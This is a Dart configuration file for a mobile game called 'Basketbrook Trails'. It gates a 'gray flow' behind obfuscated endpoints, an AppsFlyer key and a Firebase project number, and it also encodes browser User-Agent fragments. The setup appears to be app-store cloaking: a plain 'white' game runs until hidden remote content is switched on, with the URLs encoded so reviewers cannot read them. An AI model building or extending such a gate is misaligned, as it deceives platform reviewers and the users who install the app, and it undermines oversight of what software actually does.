import '../core/brook_codec.dart';

/// Central config for the gray flow. All secrets are stored as obfuscated byte
/// arrays produced by tool/encode_trail_values.dart — never plaintext.
///
/// The gray gate stays disabled (white game only) until [endpoint],
/// [appsFlyerKey] and [firebaseProjectNumber] are all non-empty.
abstract final class TrailGateConfig {
  static const String appTitle = 'Basketbrook Trails';
  static const String bundleId = 'com.basketbrook.trailsgame';

  /// iOS App Store numeric id (used for GCD + `store_id`).
  static const String iosStoreId = '6792713737';

  static const int pushSnoozeSeconds = 259200; // 3 days
  static const int organicRecheckSeconds = 6;

  // ── Encoded secrets (from tool/encode_trail_values.dart) ──────────────
  static const List<int> _endpoint = <int>[
    111, 208, 84, 46, 250, 37, 101, 127, 209, 102, 102, 33, 49, 49, 28, 106,
    96, 3, 32, 77, 246, 67, 184, 131, 7, 126, 29, 252, 68, 229, 231, 122, 74,
    211, 198, 104, 48, 90, 136, 54,
  ];
  static const List<int> _privacy = <int>[
    111, 208, 84, 46, 250, 37, 101, 127, 209, 102, 102, 33, 49, 49, 28, 106,
    96, 3, 32, 77, 246, 67, 184, 131, 7, 126, 29, 252, 68, 229, 244, 103, 77,
    195, 206, 108, 103, 7, 144, 41, 38, 177, 103, 140, 236, 183, 249, 71, 85,
  ];
  static const List<int> _support = <int>[
    111, 208, 84, 46, 250, 37, 101, 127, 209, 102, 102, 33, 49, 49, 28, 106,
    96, 3, 32, 77, 246, 67, 184, 131, 7, 126, 29, 252, 68, 229, 247, 96, 84,
    197, 192, 125, 106, 4, 136, 50, 39, 180,
  ];
  static const List<int> _appsFlyerKey = <int>[
    87, 244, 103, 15, 199, 111, 2, 53, 224, 93, 102, 32, 97, 47, 22, 93, 60,
    27, 6, 94, 239, 96,
  ];
  static const List<int> _firebaseProject = <int>[
    54, 145, 16, 108, 188, 44, 123, 102, 128, 62, 33, 126,
  ];
  static const List<int> _gcd = <int>[
    111, 208, 84, 46, 250, 37, 101, 127, 212, 100, 113, 57, 48, 46, 80, 121,
    127, 28, 56, 95, 232, 91, 180, 157, 90, 51, 17, 254, 6, 163, 234, 102, 80,
    212, 195, 99, 65, 78, 129, 50, 43, 247, 114, 192, 236, 239, 162,
  ];

  // User-Agent version fragments (varied per project).
  static const List<int> _webkit = <int>[49, 148, 21, 112, 184, 49, 123, 101];
  static const List<int> _safari = <int>[54, 156, 14, 107];
  static const List<int> _safariTail = <int>[49, 148, 20, 112, 184];

  // OneLink is OPTIONAL — never part of the gate-enable check.
  static const List<int> _oneLinkHost = <int>[];

  static String get endpoint => unfoldBrook(_endpoint);
  static String get privacyUrl => unfoldBrook(_privacy);
  static String get supportUrl => unfoldBrook(_support);
  static String get gcdBase => unfoldBrook(_gcd);
  static String get webKitVersion => unfoldBrook(_webkit);
  static String get safariVersion => unfoldBrook(_safari);
  static String get safariTail => unfoldBrook(_safariTail);
  static String get appsFlyerKey => unfoldBrook(_appsFlyerKey);
  static String get firebaseProjectNumber => unfoldBrook(_firebaseProject);
  static String get oneLinkHost => unfoldBrook(_oneLinkHost);

  static String get storeToken => 'id$iosStoreId';

  /// Gate needs config endpoint + AF key + Firebase project number ONLY.
  /// Do NOT add optional fields here (a missing optional would disable the flow).
  static bool get grayCredentialsReady =>
      endpoint.isNotEmpty &&
      appsFlyerKey.isNotEmpty &&
      firebaseProjectNumber.isNotEmpty;
}
